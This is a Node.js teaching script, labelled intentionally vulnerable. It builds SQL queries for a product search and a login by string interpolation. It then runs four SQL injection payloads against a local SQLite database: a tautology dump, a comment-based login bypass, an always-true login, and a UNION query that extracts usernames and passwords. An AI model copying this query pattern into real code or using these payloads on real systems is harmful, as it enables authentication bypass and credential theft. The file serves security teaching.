// vulnerable.js
// Run: node vulnerable.js
// WARNING: This file is INTENTIONALLY vulnerable - for learning purposes only

const Database = require('better-sqlite3');
const db = new Database('nyondo_stock.db');

// ── VULNERABLE search function (uses template literal - BAD) ───────────────
function searchProduct(name) {
  const query = `SELECT * FROM products WHERE name LIKE '%${name}%'`;
  console.log('Query:', query);
  const rows = db.prepare(query).all();
  console.log('Result:', rows, '\n');
  return rows;
}

// ── VULNERABLE login function (uses template literal - BAD) ───────────────
function login(username, password) {
  const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
  console.log('Query:', query);
  const row = db.prepare(query).get();
  console.log('Result:', row, '\n');
  return row;
}

// ══════════════════════════════════════════════════════════════════════════
// ATTACK CALLS - all 4 injection attacks
// ══════════════════════════════════════════════════════════════════════════

console.log('='.repeat(60));
console.log('ATTACK 1 - Dump all products (OR 1=1)');
console.log('='.repeat(60));
searchProduct("' OR 1=1--");

console.log('='.repeat(60));
console.log('ATTACK 2 - Login bypass with no password');
console.log('='.repeat(60));
login("admin'--", "anything");

console.log('='.repeat(60));
console.log('ATTACK 3 - Always true login (OR 1=1)');
console.log('='.repeat(60));
login("' OR '1'='1", "' OR '1'='1");

console.log('='.repeat(60));
console.log('ATTACK 4 - UNION attack (steal users via product search)');
console.log('='.repeat(60));
searchProduct("' UNION SELECT id, username, password, role FROM users--");
